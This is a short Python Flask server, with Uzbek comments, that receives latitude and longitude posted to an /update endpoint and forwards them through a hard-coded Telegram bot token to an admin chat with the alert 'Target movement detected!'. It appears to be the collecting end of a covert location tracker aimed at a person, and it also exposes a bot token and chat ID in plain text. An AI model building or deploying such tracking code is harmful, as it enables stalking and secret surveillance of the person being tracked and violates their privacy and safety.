from flask import Flask, request, jsonify
import requests

# --- SOZLAMALAR ---
BOT_TOKEN = "8528348317:AAG6VsZtznGPoz7QpziWwVazkbIK_HnoKfc"
ADMIN_ID = 7441283431

app_flask = Flask(__name__)

def send_telegram_location(lat, lon):
    """Telegram API orqali lokatsiya yuborish"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
    payload = {
        "chat_id": ADMIN_ID,
        "latitude": lat,
        "longitude": lon
    }
    try:
        requests.post(url, json=payload)
        # Shuningdek matnli xabar ham yuboramiz
        msg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(msg_url, json={
            "chat_id": ADMIN_ID, 
            "text": "📍 **Target harakati aniqlandi!**"
        })
    except Exception as e:
        print(f"Xato: {e}")

@app_flask.route('/update', methods=['POST'])
def update():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400
            
        lat = data.get('lat')
        lon = data.get('lon')
        
        if lat and lon:
            send_telegram_location(lat, lon)
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"error": "Missing coords"}), 400
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app_flask.route('/')
def home():
    return "Server is working perfectly!"

# Mahalliy kompyuterda sinab ko'rish uchun (Render bu qismini ishlatmaydi)
if __name__ == '__main__':
    app_flask.run(host='0.0.0.0', port=5000)